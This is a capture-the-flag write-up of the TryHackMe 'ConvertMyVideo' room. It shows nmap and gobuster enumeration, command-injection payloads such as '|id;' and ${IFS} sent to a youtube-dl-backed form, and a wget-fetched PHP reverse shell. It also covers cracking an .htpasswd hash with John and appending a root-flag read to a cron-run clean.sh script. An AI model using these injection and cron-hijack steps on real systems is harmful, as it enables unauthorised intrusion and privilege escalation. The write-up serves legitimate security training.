---
author: "Shebu"
title: "ConvertMyVideo: THM"
date: "2021-11-27"
tags: ["youtube-dl", "command-injection", "cronjob", "jtr", "pspy"]
cover:
    image: img/convertmyvideo.png
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

My Script to convert videos to MP3 is super secure. You can convert your videos: Why don't you check it out!

*[Image: header]*

|  **Room name** 	| Convert My Video                          	|
|:--------------:	|-------------------------------------------	|
|     **OS**     	| Linux                                     	|
| **Difficulty** 	| Medium                                    	|
|  **Room Link** 	| https://tryhackme.com/room/convertmyvideo 	|
|   **Creator**  	| [overjt](https://tryhackme.com/p/overjt)  	|

# Enumeration

## Portscan

```bash
➜  yt-convert nmap -sC -sV 10.10.240.17 -v -oN yt-convert.nmap

# Nmap 7.91 scan initiated Sat Nov 27 06:13:41 2021 as: nmap -sC -sV -v -oN yt-convert.nmap 10.10.240.17
Increasing send delay for 10.10.240.17 from 5 to 10 due to 11 out of 30 dropped probes since last increase.
Nmap scan report for 10.10.240.17
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 27 06:14:29 2021 -- 1 IP address (1 host up) scanned in 47.53 seconds
```

As you can see there are only 2 ports open 

* Port 22: SSH
* Port 80: HTTP: Apache 2.4.29

## Website: Port 80

The website at port 80 shows us a simple page like this 

*[Image: Website]*

It asks us for an ID to which it converts it into an video.

## Gobuster

```bash
➜  yt-convert gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://convertmyvideo.thm/ 

/admin (Status: 401)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/tmp (Status: 301)
```
```bash
QN 1- ❓
What is the name of the secret folder? - admin
```

So the only interesting find here is the `/admin` directory.Lets check it out.

*[Image: admin]*

I tried some default creds but it didn't work. So lets access this once we get some valid creds.

## Burpsuite

Lets get back to the webpage at port 80 and intercept the request to see what's happening.

I entered a random number as ID & pressed  Convert. The request looked like this 

*[Image: intercept1]*

So the only parameter here that we can play with is `yt_url`.

## youtube-dl

I tried entering `id` to see how the application responds .

*[Image: intercept2]*

Error: 
```bash
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u'id' is not a valid URL. Set --default-search \"ytsearch\" (or run  youtube-dl \"ytsearch:id\" ) to search YouTube\nsh: 1: -f: not found\n","url_orginal":"id","output":"","result_url":"\/tmp\/downloads\/61a215d9e9a4a.mp3"}
``` 

So it is running something called `youtube-dl`. Lets google and see what actually this is.

*[Image: youtube-dl]*

> Seems like it is a command line tool to download or convert youtube videos!
>
>It is run with the following syntax: `youtube-dl [OPTIONS] URL [URL...]`

*[Image: syntax]*

Assuming there is a **command injection** vulnerability , I gave this i/p in the yt_url parameter: `|id;`

NOTE- 
* `|` - will act as command separator
* `;` - acts as a line terminator ie ensures nothing executes after this .

*[Image: intercept3]*

Now the error response was like this: 
```bash
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":"|id;","output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","result_url":"\/tmp\/downloads\/61a21a622915c.mp3"}
```
Note that it returned the result of our `id` command which is `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

So now since we could execute commands , lets look at what directory we are in !

*[Image: intercept4]*

Response -
```bash
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":"|pwd;","output":"\/var\/www\/html\n","result_url":"\/tmp\/downloads\/61a21be02e591.mp3"}
```
So we are in the `/var/www/html` directory .

Lets check out the contents of the directory

*[Image: intercept5]*

Response -

```bash
Syntax error: EOF in backquote substitution
```

Seems like the space is causing errors.After some googling I found that we could use `${IFS}` which acts as a whitespace !

*[Image: intercept6]*

Response was bit confusing so I have formatted it to make it easy to understand -

```bash
total 36
drwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 3 root     root     4096 Apr 12  2020 ..
-rw-r--r-- 1 www-data www-data  152 Apr 12  2020 .htaccess
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 admin
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 images
-rw-r--r-- 1 www-data www-data 1790 Apr 12  2020 index.php
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 js
-rw-rw-r-- 1 www-data www-data  205 Apr 12  2020 style.css
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 tmp
```
## user.txt 🚩

The admin directory seems looks interesting.Lets list the contents of it.

*[Image: intercept7]*

```bash
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php
```
Wohoo!There's the first flag .Lets grab the flag and submit it 

*[Image: flag1]*

```shell
QN 3- ❓
What is the user flag? - flag{0d8486a*********7f4046ed7} 
```
# Shell as www-data

Its frustrating to use this method to execute commands so lets try getting a shell !

*[Image: intercept8]*#center

I used `wget` to transfer my payload which ``pentestmonkey's php reverse shell`` to the victim.

*[Image: intercept9]*

Then set up a listerner & execute `php shell.php` to get a reverse shell back .

*[Image: revshell]*

We are in as `www-data`.

Lets check what users are on this machine

```bash
www-data@dmv:/var/www/html/admin$ cat /etc/passwd | grep "home"    
cat /etc/passwd | grep "home"
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash
```
There is only one user other than root which is `dmv`

Remember? We saw few interesting directories like `.htpasswd` .It contained the following hash
```bash
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```
## Jtr

We crack the password using jtr

```bash
➜  yt-convert john --wordlist=/usr/share/wordlists/rockyou.txt hash

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
j**ie           (?)
1g 0:00:00:00 DONE (2021-11-27 07:32) 3.448g/s 993.1p/s 993.1c/s 993.1C/s alyssa..brenda
Use the "--show" option to display all of the cracked passwords reliably
```
Maybe this is the creds to login through the /admin directory which required creds.Anyways no need to check whats in there since we already have a reverse shell.

```bash
QN 2- ❓
What is the user to access the secret folder? - itsmeadmin
```
# Shell as root

After some enumeration , I found a wierd script called `clean.sh` in `/var/www/html/tmp/`. It contained the following lines -

```bash
www-data@dmv:/var/www/html/tmp$ cat clean.sh    
cat clean.sh
rm -rf downloads
```
## pspy

So my guess is that it is being run by cron in the background once in few mins.Lets conform that using `pspy`

*[Image: pspy]*

`clean.sh` script is indeed run by cron once in 2 mins.

## root.txt 🚩

So I added the following to the clean.sh script to retrieve the root flag !

```bash
www-data@dmv:/var/www/html/tmp$ echo "cat /root/root.txt > /home/flag.txt" >>clean.sh
```
```bash
www-data@dmv:/var/www/html/tmp$ cat clean.sh
cat clean.sh
rm -rf downloads
cat /root/root.txt > /home/flag.txt
```

After few mins, we have a file called `flag.txt` in `/home` directory which contains the flag.

```bash
QN 4- ❓
What is the root flag?: flag{d9b36*********399c5e94a}
